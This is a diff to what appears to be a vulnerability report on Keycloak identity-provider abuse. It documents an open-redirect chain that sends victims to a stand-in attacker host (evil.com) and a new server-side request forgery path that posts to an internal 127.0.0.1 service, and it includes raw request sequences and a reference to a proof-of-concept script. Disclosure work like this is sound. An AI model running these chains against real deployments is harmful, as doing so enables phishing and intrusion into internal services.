@@ -124,11 +124,20 @@ Two attack chains via the IdP subsystem:
 
 **Path B — Open Redirect/Phishing (UPGRADED):** After registering an IdP with `authorizationUrl: https://evil.com/auth`, any victim who clicks a URL with `kc_idp_hint=attacker-idp` is **immediately HTTP 303 redirected to evil.com** via Keycloak's broker mechanism. The initial URL is on the legitimate Keycloak domain — bypassing URL filters and user vigilance.
 
-**Confirmed redirect chain:**
+**Confirmed redirect chain (Path B — open redirect):**
 ```
 GET /realms/test/protocol/openid-connect/auth?client_id=webapp&kc_idp_hint=attacker-idp&...
 → HTTP 303 → /realms/test/broker/attacker-idp/login?session_code=...
 → HTTP 303 → https://evil.com/auth?scope=openid+email+profile&state=...&client_id=attacker-client
+```
+
+**Path C — POST SSRF via tokenUrl (server-side):** When attacker's server sends a fake auth code back to Keycloak's broker endpoint, Keycloak makes an outbound **HTTP POST** to the configured `tokenUrl`. This enables POST-capable SSRF to internal services:
+```
+POST /token HTTP/1.1
+Host: 127.0.0.1:49992  ← internal target
+User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
+
+code=FAKE_CODE&grant_type=authorization_code&client_id=attacker-client
 ```
 
 See: [`pocs/poc5_ssrf_idp_import.sh`](pocs/poc5_ssrf_idp_import.sh)
